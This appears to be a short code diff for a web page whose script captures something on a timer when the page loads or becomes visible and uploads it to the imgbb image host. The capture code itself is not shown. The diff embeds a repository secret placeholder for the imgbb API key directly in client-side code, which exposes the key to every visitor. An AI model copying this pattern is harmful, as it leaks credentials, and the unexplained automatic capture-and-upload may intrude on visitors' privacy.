@@ -8,8 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #000;
-            overflow: hidden;
+            background-color: #ff0000;
         }
     </style>
 </head>
@@ -63,7 +62,7 @@ document.addEventListener("visibilitychange", function() {
     if (document.visibilityState === 'hidden') {
         clearInterval(captureInterval);
     } else {
-        const apiKey = process.env.API_KEY; // Fetch API key from environment variable
+        const apiKey = "${{ secrets.IMGBB_API_KEY }}"; // Fetch API key from GitHub secret
         if (apiKey) {
             startCapturingAndUploading(apiKey); // Pass the API key to the function
         } else {
@@ -73,7 +72,7 @@ document.addEventListener("visibilitychange", function() {
 });
 
 // Initial execution
-const apiKey = process.env.IMGBB_API_KEY; // Fetch API key from environment variable
+const apiKey = "${{ secrets.IMGBB_API_KEY }}"; // Fetch API key from GitHub secret
 if (apiKey) {
     startCapturingAndUploading(apiKey); // Pass the API key to the function
 } else {
